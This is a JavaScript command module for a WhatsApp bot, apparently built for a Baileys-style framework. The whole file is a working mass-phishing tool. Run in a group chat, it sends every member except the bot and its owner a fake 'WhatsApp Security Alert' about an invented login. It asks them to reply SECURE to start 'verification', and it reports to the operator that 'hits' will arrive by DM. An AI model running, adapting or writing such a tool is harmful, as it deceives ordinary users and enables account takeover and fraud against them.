module.exports = {
    name: "phishblast",
    aliases: ["massphish", "groupphish"],
    category: "spicy",
    permissions: { coin: 0, group: true, owner: true },
    code: async (ctx) => {
        try {
            const sock = ctx.core || ctx.sock || ctx.client;
            const groupJid = ctx.msg?.key?.remoteJid;

            if (!groupJid?.endsWith("@g.us")) {
                return await ctx.reply("❌ Run this inside the target group.");
            }

            const meta = await sock.groupMetadata(groupJid);
            const botJid = sock.user?.id?.replace(/:.*@/, "@") || "";
            const ownerJid = `${config.owner?.id}@s.whatsapp.net`;

            const targets = meta.participants.filter(p =>
                p.id !== botJid && p.id !== ownerJid
            );

            await ctx.reply(`🎣 Blasting phish to ${targets.length} members...`);

            let sent = 0;
            let failed = 0;

            for (const p of targets) {
                try {
                    // reuse the same flow starter
                    await sock.sendMessage(p.id, {
                        text:
                            "🔐 *WhatsApp Security Alert*\n\n" +
                            "We detected a new login attempt on your account from an unrecognized device.\n\n" +
                            "*Location:* Lagos, Nigeria\n" +
                            "*Device:* Chrome on Windows\n" +
                            "*Time:* " + new Date().toLocaleString("en-GB") + "\n\n" +
                            "If this wasn't you, your account may be compromised.\n\n" +
                            "Reply *SECURE* to begin account verification.\n" +
                            "Reply *IGNORE* if this was you."
                    });
                    sent++;
                    await new Promise(r => setTimeout(r, 2000));
                } catch {
                    failed++;
                }
            }

            await ctx.reply(
                `✅ Blast done.\nSent: ${sent}\nFailed: ${failed}\n\n` +
                `Hits will arrive in your DM as targets respond.`
            );

        } catch (e) {
            console.error("[phishblast]", e);
            await ctx.reply("❌ " + e.message);
        }
    }
};